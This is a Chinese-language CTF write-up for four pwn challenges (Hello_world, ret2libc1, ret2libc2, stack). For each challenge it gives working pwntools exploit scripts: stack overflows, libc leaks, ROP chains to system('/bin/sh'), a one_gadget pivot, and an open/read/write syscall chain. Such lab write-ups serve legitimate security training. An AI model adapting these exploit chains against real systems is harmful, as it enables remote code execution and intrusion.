# Hello_world
签到题，利用栈溢出漏洞劫持返回函数至`backdoors`即可。
exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = False
ip = 'node2.anna.nssctf.cn'
port = 28485
if local:
	p = process('./Hello_world')
	pwnlib.gdb.attach(p, 'b func1')
else:
	p = remote(ip, port)
	# p = websocket()

payload = b'a' * (0x20 + 8) + b'\xc5'
p.send(payload)
p.interactive()
```
# ret2libc1
菜单题，可以找到栈溢出漏洞在`shop`函数里
![[Pasted image 20250302221923.png]]
`main`函数中可以找到当输入7时会执行`see_it`函数，可以刷钱，刷了钱后便可以买下商店触发栈溢出漏洞。
![[Pasted image 20250302222124.png]]
利用该漏洞可以泄漏`libc`基址构造`rop`。
exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = False
ip = 'node2.anna.nssctf.cn'
port = 28561
if local:
	p = process('./attachment')
	pwnlib.gdb.attach(p, 'b ')
else:
	p = remote(ip, port)
	# p = websocket()

elf = ELF('./attachment')
libc = ELF('./libc.so.6')

ret = 0x400579
pop_rdi = 0x400d73

p.recvuntil(b'6.check youer money\n')
p.sendline(b'7')
p.recvuntil(b'exchange?')
p.sendline(b'1000')
p.recvuntil(b'6.check youer money\n')
p.sendline(b'5')
p.recvuntil(b'name it!!!\n')

payload = b'a' * (0x40 + 8)
payload += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x400b1e)

p.sendline(payload)

puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info('puts_addr: ' + hex(puts_addr))

libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a' * (0x40 + 8)
payload += p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
p.recvuntil(b'name it!!!\n')
p.sendline(payload)

p.interactive()
```

# ret2libc2
`one_gadget`类型的题目。
需要先想办法泄漏`libc`基址，因为不能直接控制`pop rdi; ret` 需要找别的方法。
![[Pasted image 20250302222628.png]]
能想到的方法就是利用`printf`函数将函数的`got`泄漏出来
![[Pasted image 20250302222757.png]]
从汇编可以看出这里将`rbp - 0x10`赋给`rax`，所以在第一次`read`时将某一函数的`got + 0x10`放在此处即可，如下图
![[Pasted image 20250302223055.png]]
泄漏之后可以算出`libc`基址，查找使用哪个`gadget`
![[Pasted image 20250302223226.png]]
可以发现都需要`rbp-0xXX`可以执行，可以看到有`leave ret`，将`rbp`迁移到一个可执行的位置即可。
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = True
ip = 'node2.anna.nssctf.cn'
port = 28713
if local:
	p = process('./ret2libc2')
	pwnlib.gdb.attach(p, 'b func')
else:
	p = remote(ip, port)
	# p = websocket()

elf = ELF('./ret2libc2')
libc = ELF('./libc.so.6')
ret = 0x40101a

p.recvuntil(b'magic')
payload = p64(elf.got['puts']) + b'\x00' * 0x28 + p64(elf.got['setvbuf'] + 0x10) + p64(0x401223)
p.send(payload)

p.recvuntil(b'\n')
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.success('puts_addr: ' + hex(puts_addr))
libc_base = puts_addr - libc.symbols['setvbuf']
log.success('libc_base: ' + hex(libc_base))

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

ogg = libc_base + 0xebc81

p.recvuntil(b'magic')
payload = b'\x00' * (0x30) + p64(elf.bss() + 0x100) + p64(ogg)

p.send(payload)

p.interactive()
```
# stack
反编译后的伪代码看不出什么，需要直接看汇编
![[Pasted image 20250302223649.png]]
主函数`print`了两个``msg``以及一个`rsp`指针，然后`read`之后跳转到`rsp`指的地方
![[Pasted image 20250302223809.png]]
再看看`print`函数以及`gadgets`函数，利用这些可以做到控制`rax,rsi,rdi,rbx,r13,r15`，
![[Pasted image 20250302224032.png]]
接受一下泄漏的地址可以发现是栈地址，可以把文件路径存在这里后面调用。
调试很久本打算控制寄存器调用`execve`直接`binsh`，但发现不能控制`rdx`用不了`execve`（也可能我哪里弄错了），最后选择构造`orw`。
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = True
ip = 'node2.anna.nssctf.cn'
port = 28073
if local:
	p = process('./stack')
	pwnlib.gdb.attach(p, 'b *0x401033')
else:
	p = remote(ip, port)
	# p = websocket()  

ret = 0x401013
elf = ELF('./stack')

p.recvuntil(b'\x20\x29\x0a')
recv = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f'recv: {hex(recv)}')

p.recvuntil(b'\x3e\x3e\x20')
payload = flat([
	# open
	0x401017,
	0,
	0,
	'./flag\x00\x00', # 将路径存在泄漏的栈地址
	0x401017,
	0,
	0,
	0,
	2,                # r13赋值open的系统调用，后面赋给rax
	0x40100c,
	0x401017,
	0,
	0,
	0,
	0x401017,
	0,
	recv,             # rdi赋值flag地址
	0,
	0,
	0x401077,         # syscall系统调用
	# read
	0x401017,
	0,
	0,
	0,                # r13赋值read的系统调用
	0x40100c,
	0x401017,
	0,
	0,
	0,
	0x401017,
	0x4023d0,         # rsi赋值缓存地址
	3,                # rdi赋值fd文件符
	0,
	0,
	0x401077,         # syscall
	# write
	0x401017,
	0,
	0,
	1,                # write系统调用
	0x40100c,
	0x401017,
	0,
	0,
	0,
	0x401017,
	0x402000 - 0x10, # rsi缓存地址
	1,               # rdi fd文件符
	0,
	0,
	0x401077,
])
p.sendline(payload)

p.interactive()
```